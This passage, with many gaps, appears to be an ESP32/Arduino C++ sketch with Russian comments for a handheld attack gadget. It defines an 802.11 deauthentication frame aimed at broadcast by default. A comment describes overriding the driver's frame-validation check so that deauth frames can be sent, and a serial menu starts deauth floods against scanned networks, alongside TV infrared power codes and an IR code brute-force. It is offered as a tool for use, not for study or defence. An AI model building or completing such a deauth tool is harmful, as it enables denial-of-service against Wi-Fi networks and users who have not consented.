...
// Структура Deauth кадра (26 байт)
typedef struct {
    uint8_t header[4];      // Frame Control + Duration
    uint8_t station[6];     // MAC адрес клиента (или broadcast)
    uint8_t access_point[6];// MAC адрес роутера
    uint8_t sender[6];      // MAC отправителя (дублирует AP)
    uint8_t sequence[2];    // Sequence number
    uint8_t reason[2];      // Reason code
...
uint8_t targetClient[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast по умолчанию
...
// ═══════════════════════════════════════════════════════════════
// Эта функция вызывается драйвером для проверки валидности кадров
// Возвращая 0, мы разрешаем отправку любых кадров (включая deauth)
...
// ═══════════════════════════════════════════════════════════════
// LG TV (NEC 32-bit)
#define LG_POWER_CODE 0x20DF0CF3  // LG TV Power On/Off [[31]]

// Samsung TV (NEC 32-bit)  
#define SAMSUNG_POWER_CODE 0xE0E040BF  // Samsung TV Power Toggle [[40]]
...
void buildDeauthFrame(uint8_t* ap, uint8_t* client, uint16_t reason = 0x0007) {
    ...
    deauthFrame.header[2] = 0x00;  // Duration
...
void scanNetworks() {
    ...
    // Останавливаем deauth если активен
...
void sendIR_LG_Power() {
    ...
    delay(100);
    irSender.sendNEC(LG_POWER_CODE, 32); // Дублируем для надёжности
    Serial.println("✅ Sent!");
}
...
void setup() {
    ...
    // WiFi в режиме STA для сканирования
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
...
void loop() {
    // Отправка deauth кадров если активен
    if (deauthActive) {
        sendDeauth();
    }
    ...
    if (Serial.available()) {
        ...
        if (cmd == "help" || cmd == "?") {
            ...
            Serial.println("   scan          - Scan WiFi networks");
            Serial.println("   deauth <num>  - Start deauth on network #");
            Serial.println("   deauth <num> <reason> - With specific reason code");
            Serial.println("   stop          - Stop deauth");
            Serial.println("   lg            - Send LG TV Power");
            Serial.println("   samsung       - Send Samsung TV Power");
            Serial.println("   brute         - IR Brute-Force (1000 codes)");
            ...
            if (spaceIdx == -1) {
                Serial.println("❌ Usage: deauth <network_number> [reason]");
                Serial.println("   Example: deauth 0");
                Serial.println("   Example: deauth 0 0x0007");
            } else {
